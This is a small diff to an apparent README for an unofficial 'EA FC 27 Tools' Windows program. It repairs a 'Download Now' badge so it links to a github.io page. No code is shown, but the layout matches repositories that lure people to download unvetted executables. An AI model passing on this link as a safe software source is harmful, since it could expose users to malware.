@@ -15,8 +15,7 @@
 
 ### ⬇️ Download
 
-[![Download Now](https://img.shields.io/badge/Download-EA%20FC%2027%20Tools-blue?style=for-the-badge\&logo=github)](knobbyspeak.github.io
-)
+[![Download Now](https://img.shields.io/badge/Download-EA%20FC%2027%20Tools-blue?style=for-the-badge\&logo=github)](https://knobbyspeak.github.io/)
 
 **Latest Version:** `v0.7` • **Platform:** `Windows 10/11`
 
